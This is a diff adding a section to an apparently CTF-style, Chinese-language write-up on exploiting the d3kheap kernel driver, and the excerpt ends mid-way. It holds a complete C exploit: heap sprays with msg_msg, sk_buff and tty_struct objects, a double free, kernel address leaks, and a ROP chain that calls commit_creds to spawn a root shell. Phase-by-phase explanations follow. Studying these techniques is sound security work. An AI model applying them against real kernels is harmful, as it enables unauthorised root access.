@@ -1849,7 +1849,1210 @@ void phase_10_trigger_exploit(void) {
               height: auto;">
 </div>
 
+## 5. 进阶分析：tty_struct结构利用
+
+exploit核心代码如下：
+
+```c
+/* ===========================================================
+ * KERNEL SYMBOL OFFSETS & GADGETS
+ * =========================================================== */
+#define PREPARE_KERNEL_CRED 0xffffffff810cee40    // prepare_kernel_cred function address
+#define COMMIT_CREDS 0xffffffff810ce940           // commit_creds function address
+#define SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff81e00ff0  // Return to user mode gadget
+#ifdef SECONDARY_STARTUP_64
+#undef SECONDARY_STARTUP_64
+#endif
+#define SECONDARY_STARTUP_64 0xffffffff81000040
+
+/* ROP gadgets for control flow hijacking */
+#define PUSH_RBX_POP_RSP_POP_RBP_RET 0xffffffff8113c459 // push rbx; sub eax, 0x415b0007; pop rsp; pop rbp; ret;
+#define POP_RSP_RET 0xffffffff81034cf0           // pop rsp; ret
+#define ADD_RSP_0X50_RET 0xffffffff81137a45      // add rsp, 0x50; ret
+#define POP_RDI_RET 0xffffffff8108f9c0           // pop rdi; ret
+#define POP_RCX_RET 0xffffffff81222333           // pop rcx; ret
+#define MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET 0xffffffff81c3c9bb  // mov rdi, rax; rep movsq; ret
+
+/* ===========================================================
+ * HEAP SPRAY PARAMETERS
+ * =========================================================== */
+#define MSG_SIZE 0x400                  // Standard message size (1KB)
+#define MSG_TYPE 0x41                   // Message type identifier
+#define OOB_MSG_SIZE 0x1000             // Out-of-bounds read size (4KB)
+#define TTY_SPRAY_COUNT 0xf0 * 2        // Maximum number of tty_struct to spray
+#define MSG_QUEUE_NUM 0x1000            // Number of message queues (4096)
+
+/* ===========================================================
+ * DATA STRUCTURES
+ * =========================================================== */
+/* Standard message structure for IPC */
+struct {
+    long mtype;                           // Message type
+    char mtext[MSG_SIZE - sizeof(struct msg_msg)];  // Message text buffer
+} msg_data;
+
+struct {
+    long mtype;                           // Message type
+    char mtext[OOB_MSG_SIZE - sizeof(struct msg_msgseg) + MSG_SIZE - sizeof(struct msg_msg)];  // Message text buffer
+} oob_msg_data;
+
+/* ===========================================================
+ * GLOBAL STATE VARIABLES
+ * =========================================================== */
+int ptmx_fds[TTY_SPRAY_COUNT];          // tty file descriptors for heap spraying
+int sock_fds[SOCKET_NUM][2];            // Socket pair file descriptors for sk_buff spraying
+int msqid[MSG_QUEUE_NUM];               // Message queue identifiers for msg_msg spraying
+size_t dev_fd;                          // File descriptor for vulnerable character device
+size_t *leak_data;                      // Pointer to store leaked kernel data
+int victim_qid = -1;                    // Queue ID containing the UAF victim object
+int found_nearby_msg_msg = 0;           // Flag indicating nearby msg_msg found during OOB read
+int nearby_qid = -1;                    // Queue ID of nearby message for exploitation
+int nearby_offset_idx = -1;             // Offset index for nearby message in OOB read
+size_t nearby_msg_msg_addr;             // Address of nearby msg_msg structure
+size_t nearby_msg_queue_addr;           // Address of nearby message queue structure
+size_t *fake_tty_struct = NULL;         // Pointer to fake tty_struct buffer
+size_t *rop_chain = NULL;               // Pointer to ROP chain buffer
+int rop_idx = 0;                        // Current index in ROP chain
+char fake_msg[704] = {0};               // Fake message buffer for exploitation
+size_t fake_msg_msgseg_addr;            // Address for fake msg_msgseg structure
+
+/* ===========================================================
+ * DEVICE INTERACTION COMMANDS
+ * =========================================================== */
+#define OBJ_ADD 0x1234                  // IOCTL command to allocate object
+#define OBJ_EDIT 0x4321                 // IOCTL command to edit object
+#define OBJ_SHOW 0xbeef                 // IOCTL command to show object
+#define OBJ_DEL 0xdead                  // IOCTL command to delete/free object
+
+/**
+ * @brief Allocate a kernel object via ioctl
+ */
+void add_chunk(void) {
+    ioctl(dev_fd, OBJ_ADD);
+}
+
+/**
+ * @brief Free a kernel object via ioctl
+ */
+void delete_chunk(void) {
+    ioctl(dev_fd, OBJ_DEL);
+}
+
+/* ===========================================================
+ * HELPER FUNCTIONS
+ * =========================================================== */
+
+/**
+ * @brief Create a tty_struct for heap spraying
+ * @param tty_idx Index in ptmx_fds array
+ */
+void alloc_tty(int tty_idx) {
+    ptmx_fds[tty_idx] = open("/dev/ptmx", O_RDWR | O_NOCTTY);
+    if (ptmx_fds[tty_idx] < 0) {
+        log.error("Failed to open /dev/ptmx");
+        exit(-1);
+    }
+}
+
+/* ===========================================================
+ * EXPLOIT PHASE FUNCTIONS
+ * =========================================================== */
+
+/**
+ * @brief Phase 1: Environment initialization and device setup
+ * Sets up CPU affinity, saves user state, and opens vulnerable device
+ */
+void phase_1_init_environment(void) {
+    log.info("===========================================================");
+    log.info("PHASE 1: ENVIRONMENT INITIALIZATION & DEVICE SETUP         ");
+    log.info("===========================================================");
+
+    log.info("Initializing exploit environment");
+    bind_core(0);                         // Pin to core 0 for consistent behavior
+    save_status();                         // Save user-mode registers for later return
+
+    log.info("Opening vulnerable character device /dev/d3kheap");
+    dev_fd = open("/dev/d3kheap", O_RDONLY);
+    if (dev_fd < 0) {
+        log.error("Failed to open /dev/d3kheap!");
+        exit(-1);
+    }
+    log.success("Device opened successfully, fd: %ld", dev_fd);
+}
+
+/**
+ * @brief Phase 2: Socket pair preparation for heap spraying
+ * Creates socket pairs for sk_buff heap spraying
+ */
+void phase_2_prepare_sockets(void) {
+    log.info("===========================================================");
+    log.info("PHASE 2: SOCKET PAIR PREPARATION FOR HEAP SPRAYING        ");
+    log.info("===========================================================");
+
+    log.info("Creating %d socket pairs for sk_buff spraying", SOCKET_NUM);
+    for (int i = 0; i < SOCKET_NUM; i++) {
+        if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fds[i]) < 0) {
+            log.error("Failed to create socket pair %d!", i);
+            exit(-1);
+        }
+    }
+    log.success("Successfully created %d socket pairs", SOCKET_NUM);
+}
+
+/**
+ * @brief Phase 3: Message queue spraying and overlapping object setup
+ * Creates message queues and sprays msg_msg objects to occupy freed memory
+ */
+void phase_3_spray_msg_queues(void) {
+    log.info("===========================================================");
+    log.info("PHASE 3: MESSAGE QUEUE SPRAYING & OVERLAPPING OBJECT SETUP");
+    log.info("===========================================================");
+
+    log.info("Creating %d message queues for heap grooming", MSG_QUEUE_NUM);
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        if ((msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT)) < 0) {
+            log.error("Failed to create msg_queue %d!", i);
+            exit(-1);
+        }
+    }
+    log.success("Successfully created %d message queues", MSG_QUEUE_NUM);
+
+    log.info("Triggering allocation of target chunk via ioctl");
+    add_chunk();                          // Allocate initial chunk
+    log.info("Freeing target chunk to create dangling pointer");
+    delete_chunk();                       // Free chunk to create UAF condition
+
+    log.info("Spraying msg_msg objects (%d bytes each) to occupy freed chunk", MSG_SIZE);
+    memset(&msg_data, 0, sizeof(msg_data));
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        *(size_t *)&msg_data.mtext[0] = MSG_TYPE;
+        *(size_t *)&msg_data.mtext[8] = *(size_t *)"BinRacer";
+        *(size_t *)&msg_data.mtext[16] = i;
+        *(size_t *)&msg_data.mtext[24] = *(size_t *)"BinRacer";
+        if (write_msg(msqid[i], &msg_data, sizeof(msg_data), MSG_TYPE) < 0) {
+            log.error("Failed to send msg to queue %d!", i);
+            exit(-1);
+        }
+    }
+    log.success("Completed msg_msg spraying across all queues");
+}
+
+/**
+ * @brief Phase 4: Trigger use-after-free vulnerability
+ * Double-frees the target chunk and sprays tty_structs to reclaim it
+ */
+void phase_4_trigger_uaf(void) {
+    log.info("===========================================================");
+    log.info("PHASE 4: TRIGGER USE-AFTER-FREE VULNERABILITY             ");
+    log.info("===========================================================");
+
+    log.info("Double-freeing target chunk to create UAF condition");
+    delete_chunk();                       // Second free creates UAF
+
+    log.info("Spraying tty_structs to reclaim freed memory (%d tty_structs)", TTY_SPRAY_COUNT);
+    for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+        alloc_tty(i);
+    }
+    log.success("tty_structs spraying completed");
+}
+
+/**
+ * @brief Phase 5: Identify victim object and leak kernel base
+ * Scans message queues to find the one containing our UAF victim
+ */
+void phase_5_identify_victim(void) {
+    log.info("===========================================================");
+    log.info("PHASE 5: IDENTIFY VICTIM OBJECT & LEAK KERNEL BASE        ");
+    log.info("===========================================================");
+
+    log.info("Scanning message queues to locate UAF victim");
+    victim_qid = -1;
+    for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+        int ret = peek_msg(msqid[i], &msg_data, sizeof(msg_data), 0);
+        // Check if read size differs from expected (indicates tty_struct overlap)
+        if (ret != (MSG_SIZE - sizeof(struct msg_msg))) {
+            victim_qid = i;
+            log.success("Victim queue ID: %d, unexpected read size: %d", victim_qid, ret);
+            break;
+        }
+    }
+    if (victim_qid == -1) {
+        err_exit("Failed to locate UAF in message queues!");
+    }
+}
+
+/**
+ * @brief Phase 6: Out-of-bounds read to leak adjacent objects
+ * Uses OOB read to discover nearby msg_msg structures and their queue addresses
+ */
+void phase_6_oob_read_leak(void) {
+    log.info("===========================================================");
+    log.info("PHASE 6: OUT-OF-BOUNDS READ TO LEAK ADJACENT OBJECTS      ");
+    log.info("===========================================================");
+
+    log.info("Closing all tty_structs to free memory for OOB read");
+    for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+        close(ptmx_fds[i]);
+    }
+
+    log.info("Constructing fake msg_msg for OOB read (size: %d bytes)", OOB_MSG_SIZE);
+    build_msg((struct msg_msg *)fake_msg, 0, 0, MSG_TYPE,
+              OOB_MSG_SIZE - sizeof(struct msg_msg), 0, 0);
+
+    log.info("Spraying sk_buff objects to fill memory hole");
+    if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to spray sk_buff!");
+        exit(-1);
+    }
+    log.success("sk_buff spraying completed");
+
+    log.info("Performing OOB read to scan adjacent memory regions");
+    peek_msg(msqid[victim_qid], &msg_data,
+             OOB_MSG_SIZE - sizeof(struct msg_msg) + 0x8, 0);
+
+    found_nearby_msg_msg = 0;
+    for (int i = 1; i < 3; i++) {
+        leak_data = (size_t *)&msg_data.mtext[0x400 * i - sizeof(struct msg_msg)];
+        if (leak_data[2] == MSG_TYPE) {
+            nearby_offset_idx = i;
+            found_nearby_msg_msg = 1;
+            break;
+        }
+    }
+
+    if (!found_nearby_msg_msg) {
+        log.error("Failed to locate nearby msg_msg!");
+        exit(-1);
+    }
+
+    nearby_msg_queue_addr = leak_data[0] - 0xc0;
+    nearby_qid = leak_data[8];
+    hex_dump2("Nearby msg_msg data:", leak_data, 0x50);
+    log.success("Nearby queue ID: %d", nearby_qid);
+    log.success("Leaked nearby msg_queue address: 0x%lx", nearby_msg_queue_addr);
+    log.success("Nearby nearby msg_msg->m_list.next: 0x%lx", leak_data[0]);
+    log.success("Nearby nearby msg_msg->m_list.prev: 0x%lx", leak_data[1]);
+}
+
+/**
+ * @brief Phase 7: Leak kernel base address
+ * Uses OOB read to leak kernel symbols and calculate kernel base
+ */
+void phase_7_leak_kernel(void) {
+    log.info("===========================================================");
+    log.info("PHASE 7: LEAK KERNEL BASE ADDRESS                          ");
+    log.info("===========================================================");
+
+    log.info("Freeing sk_buff objects to prepare for new spray");
+    if (free_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to free sk_buff again!");
+        exit(-1);
+    }
+
+    fake_msg_msgseg_addr = (nearby_msg_queue_addr & 0xfffffffff0000000) + 0x9d000 - 0x20;
+    build_msg((struct msg_msg *)fake_msg,
+              nearby_msg_queue_addr + 0xc0,
+              nearby_msg_queue_addr + 0xc0,
+              MSG_TYPE,
+              OOB_MSG_SIZE - sizeof(struct msg_msgseg) + MSG_SIZE - sizeof(struct msg_msg),
+              fake_msg_msgseg_addr, 0);
+
+    log.info("Re-spraying sk_buff with extended fake msg_msg");
+    if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to re-spray sk_buff!");
+        exit(-1);
+    }
+
+    log.info("Performing extended OOB read to leak kernel symbols");
+    peek_msg(msqid[victim_qid], &oob_msg_data,
+             OOB_MSG_SIZE - sizeof(struct msg_msgseg) + MSG_SIZE - sizeof(struct msg_msg) + 0x8, 0);
+    leak_data = (size_t *)&oob_msg_data.mtext[OOB_MSG_SIZE - sizeof(struct msg_msg)];
+    kernel_offset = leak_data[3] - SECONDARY_STARTUP_64;
+    kernel_base += kernel_offset;
+    hex_dump2("Leaked msg_data:", leak_data, 0x30);
+    log.success("Leaked secondary_startup_64: 0x%lx", leak_data[3]);
+    log.success("Kernel base address: 0x%lx", kernel_base);
+    log.success("Kernel offset: 0x%lx", kernel_offset);
+}
+
+/**
+ * @brief Phase 8: Fake tty_struct operations construction
+ * Prepares fake tty_struct->ops in a nearby message queue
+ */
+void phase_8_build_fake_ops(void) {
+    log.info("===========================================================");
+    log.info("PHASE 8: FAKE TTY_STRUCT OPERATIONS CONSTRUCTION           ");
+    log.info("===========================================================");
+
+    log.info("Freeing sk_buff objects to clean memory");
+    if (free_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to free sk_buff again!");
+        exit(-1);
+    }
+
+    log.info("Constructing fake msg_msg for OOB read (size: %d bytes)", OOB_MSG_SIZE);
+    build_msg((struct msg_msg *)fake_msg, 0, 0, MSG_TYPE,
+              OOB_MSG_SIZE - sizeof(struct msg_msg), 0, 0);
+
+    log.info("Spraying sk_buff objects to fill memory hole");
+    if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to spray sk_buff!");
+        exit(-1);
+    }
+
+    log.info("Preparing fake tty_struct->ops in nearby message queue");
+    *(size_t *)&msg_data.mtext[0] = MSG_TYPE;
+    // tty_struct->ops->ioctl = kernel_offset + PUSH_RBX_POP_RSP_POP_RBP_RET
+    *(size_t *)&msg_data.mtext[0x60 - sizeof(struct msg_msg)] = kernel_offset + PUSH_RBX_POP_RSP_POP_RBP_RET;
+
+    if (write_msg(msqid[nearby_qid], &msg_data, sizeof(msg_data), MSG_TYPE) < 0) {
+        log.error("Failed to write fake ops to queue %d!", nearby_qid);
+        exit(-1);
+    }
+    log.success("Fake ops written to queue %d", nearby_qid);
+
+    log.info("Leaking address of fake ops msg_msg");
+    peek_msg(msqid[victim_qid], &msg_data,
+             OOB_MSG_SIZE - sizeof(struct msg_msg) + 0x8, 0);
+    leak_data = (size_t *)&msg_data.mtext[0x400 * nearby_offset_idx - sizeof(struct msg_msg)];
+    nearby_msg_msg_addr = leak_data[0];
+    hex_dump2("Fake ops msg_msg data:", leak_data, 0x50);
+    log.success("Leaked fake ops msg_msg address: 0x%lx", nearby_msg_msg_addr);
+
+    log.info("Releasing sk_buff objects to free memory");
+    if (free_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to free sk_buff!");
+        exit(-1);
+    }
+}
+
+/**
+ * @brief Phase 9: Bypass free checks with forged msg_msg
+ * Constructs a forged msg_msg to bypass security checks during free operation
+ */
+void phase_9_bypass_free_checks(void) {
+    log.info("===========================================================");
+    log.info("PHASE 9: BYPASS FREE CHECKS WITH FORGED MSG_MSG           ");
+    log.info("===========================================================");
+
+    log.info("Constructing forged msg_msg to bypass free() validation");
+    build_msg((struct msg_msg *)fake_msg, nearby_msg_queue_addr + 0xc0,
+              nearby_msg_queue_addr + 0xc0, MSG_TYPE,
+              MSG_SIZE - sizeof(struct msg_msg), 0, 0);
+
+    log.info("Re-spraying sk_buff with forged msg_msg");
+    if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to re-spray sk_buff!");
+        exit(-1);
+    }
+    log.success("Forged msg_msg sprayed successfully");
+
+    log.info("Triggering free of forged msg_msg");
+    read_msg(msqid[victim_qid], &msg_data, sizeof(msg_data), 0);
+
+    log.info("Re-spraying tty_structs to reclaim memory");
+    for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+        alloc_tty(i);
+    }
+    log.success("tty_structs re-spray completed");
+
+    log.info("Final cleanup of sk_buff objects");
+    if (free_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Failed to free sk_buff again!");
+        exit(-1);
+    }
+}
+
+/**
+ * @brief Phase 10: ROP chain construction and control flow hijack
+ * Builds fake tty_struct and ROP chain for privilege escalation
+ */
+void phase_10_build_rop_chain(void) {
+    log.info("===========================================================");
+    log.info("PHASE 10: ROP CHAIN CONSTRUCTION & CONTROL FLOW HIJACK     ");
+    log.info("===========================================================");
+
+    log.info("Building fake tty_struct structure");
+    fake_tty_struct = (size_t *)fake_msg;
+    fake_tty_struct[0] = 0x0000000100005401;
+    fake_tty_struct[1] = kernel_offset + ADD_RSP_0X50_RET;
+    fake_tty_struct[2] = nearby_msg_msg_addr; // tty_struct->driver
+    fake_tty_struct[3] = nearby_msg_msg_addr; // tty_struct->ops
+
+    log.info("Constructing ROP chain for privilege escalation");
+    rop_chain = (uint64_t *)&fake_msg[0x50];
+    rop_idx = 0;
+    rop_chain[rop_idx++] = *(uint64_t *)"BinRacer";           // Padding
+    rop_chain[rop_idx++] = *(uint64_t *)"BinRacer";           // Padding
+    rop_chain[rop_idx++] = kernel_offset + POP_RDI_RET;       // pop rdi gadget
+    rop_chain[rop_idx++] = 0;                                 // NULL argument
+    rop_chain[rop_idx++] = kernel_offset + PREPARE_KERNEL_CRED; // prepare_kernel_cred(0)
+    rop_chain[rop_idx++] = kernel_offset + POP_RCX_RET;       // pop rcx gadget
+    rop_chain[rop_idx++] = 0;                                 // 0 argument
+    rop_chain[rop_idx++] = kernel_offset + MOV_RDI_RAX_REP_MOVSQ_RDI_RSI_RET; // mov rdi, rax
+    rop_chain[rop_idx++] = kernel_offset + COMMIT_CREDS;      // commit_creds()
+    rop_chain[rop_idx++] = kernel_offset + SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE + 0x22;
+    rop_chain[rop_idx++] = *(uint64_t *)"BinRacer";           // Padding
+    rop_chain[rop_idx++] = *(uint64_t *)"BinRacer";           // Padding
+    rop_chain[rop_idx++] = (size_t)get_root_shell;            // Return to user shell
+    rop_chain[rop_idx++] = user_cs;                           // User code segment
+    rop_chain[rop_idx++] = user_rflags;                       // User flags
+    rop_chain[rop_idx++] = user_sp + 8;                       // User stack pointer
+    rop_chain[rop_idx++] = user_ss;                           // User stack segment
+
+    log.success("ROP chain constructed with %d gadgets", rop_idx);
+
+    log.info("Final sk_buff spray to hijack tty_struct->ops->ioctl");
+    if (spray_sk_buff(sock_fds, fake_msg, sizeof(fake_msg)) < 0) {
+        log.error("Final sk_buff spray failed!");
+        exit(-1);
+    }
+    log.success("Payload deployed successfully");
+}
+
+/**
+ * @brief Phase 11: Trigger exploit and gain root privileges
+ * Call ioctl to trigger the exploit and spawn root shell
+ */
+void phase_11_trigger_exploit(void) {
+    log.info("===========================================================");
+    log.info("PHASE 11: TRIGGER EXPLOIT & GAIN ROOT PRIVILEGES           ");
+    log.info("===========================================================");
+
+    log.info("Call ioctl to trigger fake ops->release handler");
+    for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+        ioctl(ptmx_fds[i], 0xdeadbeaf, 0xdeadbeaf);
+    }
+
+    log.success("Exploit triggered! Check for root shell...");
+}
+
+/* ===========================================================
+ * MAIN EXPLOIT ENTRY POINT
+ * =========================================================== */
+int main(int argc, char **argv, char **envp) {
+    /* Execute exploit phases sequentially */
+    phase_1_init_environment();
+    phase_2_prepare_sockets();
+    phase_3_spray_msg_queues();
+    phase_4_trigger_uaf();
+    phase_5_identify_victim();
+    phase_6_oob_read_leak();
+    phase_7_leak_kernel();
+    phase_8_build_fake_ops();
+    phase_9_bypass_free_checks();
+    phase_10_build_rop_chain();
+    phase_11_trigger_exploit();
+
+    return 0;
+}
+```
+
+### 5-1. 利用架构总览
+
+本章深入分析基于`tty_struct`结构的进阶利用技术。`tty_struct`是Linux终端子系统的核心数据结构，与`pipe_buffer`结构同属于`kmalloc-1k`缓存，这为内存重用和结构重叠创造了理想条件。与管道缓冲区相比，`tty_struct`具有更复杂的操作函数表和更多的控制点，为漏洞利用提供了新的可能性。
+
+```mermaid
+mindmap
+  root(tty_struct结构利用)
+    基础环境准备
+      阶段1: 环境初始化与设备准备
+      阶段2: 套接字对准备
+      阶段3: 消息队列堆喷与内存布局
+    内存控制建立
+      阶段4: 触发Use-After-Free漏洞
+      阶段5: 目标识别
+    信息泄露阶段
+      阶段6: 越界读取与邻近对象泄露
+      阶段7: 内核基址泄露
+    控制流劫持准备
+      阶段8: 伪造tty_struct操作函数表
+      阶段9: 绕过释放检查
+      阶段10: ROP链构建与布局
+    权限获取执行
+      阶段11: 触发利用与权限获取
+```
+
+整个利用过程包含11个精心设计的阶段，从环境准备开始，逐步建立内存控制、信息泄露、结构伪造和代码执行能力，最终实现权限提升。与之前利用`pipe_buffer`的方法相比，`tty_struct`利用具有几个显著优势：更复杂的结构体提供更多控制空间，丰富的函数指针提供更多触发点。
+
+### 5-2. 阶段1：环境初始化与设备准备
+
+**技术目标**：建立稳定可控的执行环境，为后续复杂的内存操作打下坚实基础。这个阶段处理了CPU核心绑定、用户状态保存和漏洞设备访问等基础问题，确保利用过程在可预测的条件下执行。
+
+**核心实现**：
+
+```c
+void phase_1_init_environment(void) {
+  log.info("PHASE 1: ENVIRONMENT INITIALIZATION & DEVICE SETUP");
+
+  bind_core(0);                         // 绑定到CPU核心0
+  save_status();                        // 保存用户空间寄存器状态
+
+  dev_fd = open("/dev/d3kheap", O_RDONLY);
+  if (dev_fd < 0) {
+    log.error("Failed to open /dev/d3kheap!");
+    exit(-1);
+  }
+  log.success("Device opened successfully, fd: %ld", dev_fd);
+}
+```
+
+**实现细节**：
+
+CPU核心绑定通过`bind_core(0)`将当前进程固定到CPU 0上执行。在多核处理器系统中，Linux内核的调度器会将进程在不同的CPU核心之间迁移，这种迁移会导致缓存状态的变化，进而影响内存分配器的行为。对于依赖精确时序和内存布局的漏洞利用来说，这种不确定性是致命的。通过CPU绑定，确保了所有内存操作都在同一个CPU核心的上下文中进行，提高了时序的一致性，减少了缓存效应带来的干扰。
+
+用户状态保存操作通过`save_status()`函数保存关键的寄存器状态，包括代码段寄存器CS、栈指针RSP、标志寄存器RFLAGS等。这些值在内核执行过程中会被修改，但在返回用户空间时必须恢复原状。特别需要注意的是，保存的栈指针值在后续构造ROP链时会用到，任何错误都可能导致返回用户空间时发生崩溃。
+
+设备访问是触发漏洞的前提条件。d3kheap驱动程序通过字符设备接口暴露其功能，因此需要打开`/dev/d3kheap`设备节点。成功打开设备后获得的文件描述符`dev_fd`将成为后续所有`ioctl`调用的通道。
+
+**技术要点**：
+
+- CPU绑定减少内存操作的随机性，提高利用成功率
+- 状态保存确保安全返回用户空间，避免系统崩溃
+- 设备访问是触发漏洞的前提，需要正确处理权限和错误情况
+
+### 5-3. 阶段2：套接字对准备
+
+**技术目标**：创建大量Unix域套接字对，为后续的`sk_buff`堆喷操作建立基础设施。`sk_buff`是Linux网络子系统的核心数据结构，通过控制`sk_buff`可以实现对内核内存的精确操控。
+
+**核心实现**：
+
+```c
+void phase_2_prepare_sockets(void) {
+  log.info("PHASE 2: SOCKET PAIR PREPARATION FOR HEAP SPRAYING");
+
+  for (int i = 0; i < SOCKET_NUM; i++) {
+    if (socketpair(AF_UNIX, SOCK_STREAM, 0, sock_fds[i]) < 0) {
+      log.error("Failed to create socket pair %d!", i);
+      exit(-1);
+    }
+  }
+  log.success("Successfully created %d socket pairs", SOCKET_NUM);
+}
+```
+
+**实现细节**：
+
+创建套接字对的数量`SOCKET_NUM`是一个需要精心选择的参数。数量太少可能导致堆喷密度不足，无法可靠覆盖目标内存区域；数量太多则可能消耗过多系统资源，甚至触发内存压力机制，影响系统稳定性。套接字对的管理采用了二维数组的结构`sock_fds[SOCKET_NUM][2]`，这种结构使得每个套接字对的读写端可以通过统一的索引进行访问，简化了后续的数据读写操作。
+
+Unix域套接字对的选择基于多种考虑的综合结果。与网络套接字相比，Unix域套接字具有几个显著优势：首先，它们完全在操作系统内核内部处理，不涉及网络协议栈，因此性能更高，开销更小；其次，Unix域套接字的数据传输不经过网络设备，减少了外部干扰；最后，Unix域套接字的内存分配模式更加可控，适合用于精确的内存布局。通过指定`AF_UNIX`地址族和`SOCK_STREAM`类型，创建的是可靠的、面向连接的字节流套接字，这种套接字的数据传输是有序且可靠的，简化了数据控制逻辑。
+
+**技术要点**：
+
+- Unix域套接字提供高效的进程内通信机制
+- 大量套接字对为`sk_buff`堆喷提供必要的基础设施
+- 正确的资源管理避免文件描述符泄漏
+- 流套接字确保数据的有序传输，简化数据控制逻辑
+
+### 5-4. 阶段3：消息队列堆喷与内存布局
+
+**技术目标**：通过System V消息队列大量分配`msg_msg`结构，占据d3kheap驱动程序释放的内存区域，建立可控的内存布局环境。这个阶段是内存控制的开端，为后续的漏洞触发创造条件。
+
+**核心实现**：
+
+```c
+void phase_3_spray_msg_queues(void) {
+  log.info("PHASE 3: MESSAGE QUEUE SPRAYING & OVERLAPPING OBJECT SETUP");
+
+  // 创建消息队列
+  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+    msqid[i] = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);
+  }
+
+  // 触发驱动程序内存分配与释放
+  add_chunk();
+  delete_chunk();
+
+  // 堆喷msg_msg结构
+  for (int i = 0; i < MSG_QUEUE_NUM; i++) {
+    *(size_t *)&msg_data.mtext[0] = MSG_TYPE;
+    *(size_t *)&msg_data.mtext[8] = *(size_t *)"BinRacer";
+    *(size_t *)&msg_data.mtext[16] = i;
+    write_msg(msqid[i], &msg_data, sizeof(msg_data), MSG_TYPE);
+  }
+}
+```
+
+**实现细节**：
+
+消息队列的创建采用了批量化的策略，一次性创建`MSG_QUEUE_NUM`（4096）个消息队列。每个消息队列通过`msgget`系统调用创建，使用`IPC_PRIVATE`键确保队列的唯一性，`IPC_CREAT`标志表示如果队列不存在则创建，权限模式0666允许所有用户访问。
+
+在消息队列创建完成后，利用代码开始与漏洞驱动程序交互。首先调用`add_chunk()`函数触发驱动程序的`OBJ_ADD`命令，这会执行`kmalloc(1024, GFP_KERNEL)`分配1024字节的内存缓冲区。驱动程序将`ref_count`从初始值1递增到2，这个递增操作反映了驱动程序的逻辑错误：在没有实际引用的情况下增加了引用计数。随后立即调用`delete_chunk()`触发`OBJ_DEL`命令，由于引用计数为2，驱动程序将其递减到1，然后调用`kfree(buf)`释放内存。这里的关键缺陷是释放后没有清空`buf`指针，形成了悬垂指针。
+
+驱动程序内存释放后，立即开始消息堆喷操作。堆喷的过程是向每个消息队列发送一个特定格式的消息。消息的大小被精心选择为`MSG_SIZE`（0x400，1024字节），这与驱动程序分配的内存大小完全一致。这种大小匹配确保了两种对象从相同的Slab缓存（kmalloc-1k）中分配，大大增加了内存重用的概率。
+
+```
+内存布局变化示意图：
++-------------------+     +-------------------+     +-------------------+
+| 驱动程序缓冲区    |     | 空闲状态          |     | msg_msg结构       |
+| 1024字节          | --> | 等待分配          | --> | 占据相同内存      |
+| ref_count=2       |     |                   |     | 包含控制数据      |
++-------------------+     +-------------------+     +-------------------+
+    阶段3开始时               释放后状态              堆喷后状态
+```
+
+**技术要点**：
+
+- 消息队列提供标准的`msg_msg`分配接口
+- 大量堆喷（4096个）确保高概率的内存重用
+- 消息中的标识信息便于后续识别目标
+- 精确的时序控制确保堆喷在内存释放后立即执行
+
+### 5-5. 阶段4：触发Use-After-Free漏洞
+
+**技术目标**：通过再次调用`delete_chunk()`触发Double Free漏洞，将`msg_msg`结构释放，然后通过`tty_struct`堆喷重新占用该内存，建立`msg_msg`与`tty_struct`的结构重叠。这种重叠将简单的Double Free转化为更强大的Use-After-Free原语。
+
+**核心实现**：
+
+```c
+void phase_4_trigger_uaf(void) {
+  log.info("PHASE 4: TRIGGER USE-AFTER-FREE VULNERABILITY");
+
+  log.info("Double-freeing target chunk to create UAF condition");
+  delete_chunk();                       // 第二次释放创建UAF
+
+  log.info("Spraying tty_structs to reclaim freed memory (%d tty_structs)", TTY_SPRAY_COUNT);
+  for (int i = 0; i < TTY_SPRAY_COUNT; i++) {
+    alloc_tty(i);
+  }
+  log.success("tty_structs spraying completed");
+}
+```
+
+**实现细节**：
+
+Double Free的触发机制基于驱动程序中引用计数管理的根本缺陷。在阶段3结束时，驱动程序的状态是`ref_count = 1`，`buf`指针指向已被`msg_msg`结构占用的内存区域。当再次调用`delete_chunk()`时，驱动程序检查`ref_count`不为0，将其递减到0，然后再次调用`kfree(buf)`释放内存。这是对同一内存地址的第二次释放，构成了Double Free条件。
+
+Double Free触发后，立即开始`tty_struct`堆喷。`tty_struct`是终端设备的核心数据结构，通过打开`/dev/ptmx`设备文件可以分配这些结构。`tty_struct`的大小为696字节，与`pipe_buffer`结构（1KB）和`msg_msg`结构（1KB）都属于`kmalloc-1k`缓存。这种缓存共享特性确保了内存重用的高概率。
+
+```c
+/* offset      |    size */  type = struct tty_struct {
+/* 0x0000      |  0x0004 */    int magic;
+/* 0x0004      |  0x0004 */    struct kref {
+/* 0x0004      |  0x0004 */        refcount_t refcount;
+
+                                   /* total size (bytes):    4 */
+                               } kref;
+/* 0x0008      |  0x0008 */    struct device *dev;
+/* 0x0010      |  0x0008 */    struct tty_driver *driver;
+/* 0x0018      |  0x0008 */    const struct tty_operations *ops;
+/* 0x0020      |  0x0004 */    int index;
+/* XXX  4-byte hole      */
+...
+                               /* total size (bytes):  696 */
+                             }
+/* offset      |    size */  type = struct msg_msg {
+/* 0x0000      |  0x0010 */    struct list_head {
+/* 0x0000      |  0x0008 */        struct list_head *next;
+/* 0x0008      |  0x0008 */        struct list_head *prev;
+
